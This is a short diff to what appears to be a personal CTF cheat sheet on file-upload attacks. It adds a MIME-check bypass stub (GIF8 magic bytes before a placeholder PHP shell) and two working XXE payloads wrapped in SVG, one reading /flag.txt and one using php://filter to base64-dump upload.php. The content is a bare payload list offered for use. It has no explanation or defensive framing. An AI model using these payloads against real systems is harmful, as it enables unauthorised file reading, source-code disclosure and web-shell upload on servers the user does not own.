@@ -49,5 +49,16 @@ Bash hand make wordlist:
 
 
 MIME:
-  
+  GIF8
+  <? shell code >
+
+
+XXE:
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
+  <svg>&xxe;</svg>
+
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+  <svg>&xxe;</svg>
 
